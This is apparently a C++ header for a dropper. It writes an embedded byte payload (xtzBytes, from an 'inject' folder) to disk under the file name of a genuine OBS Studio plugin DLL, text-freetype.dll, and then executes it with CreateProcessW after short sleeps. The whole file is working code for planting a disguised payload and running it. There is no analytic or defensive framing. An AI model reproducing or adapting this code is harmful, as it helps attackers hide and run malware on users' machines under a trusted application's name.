#pragma once
#include <windows.h>
#include <fstream>
#include <thread>
#include <chrono>
#include "../inject/bytes/xtz.h"


#define EXE_PATH L"C:\\Program Files\\obs-studio\\obs-plugins\\64bit\\text-freetype.dll"

void SleepWithProgress(int ms) {
    int chunks = 20;
    int interval = ms / chunks;
    for (int i = 0; i < chunks; ++i) {
        std::this_thread::sleep_for(std::chrono::milliseconds(interval));
    }
}

bool raw(const std::wstring& filePath) {
    std::ofstream file(filePath, std::ios::binary);
    if (!file) return false;
    size_t size = sizeof(xtzBytes);
    file.write(reinterpret_cast<const char*>(xtzBytes), size);
    file.close();
    return file.good();
}

bool exec(const std::wstring& filePath) {
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));

    SleepWithProgress(1000);

    if (!CreateProcessW(filePath.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        return false;
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return true;
}

int installb() {
    SleepWithProgress(1000);

    if (!raw(EXE_PATH)) return 1;

    if (!exec(EXE_PATH)) return 1;

    SleepWithProgress(800);
    return 0;
}
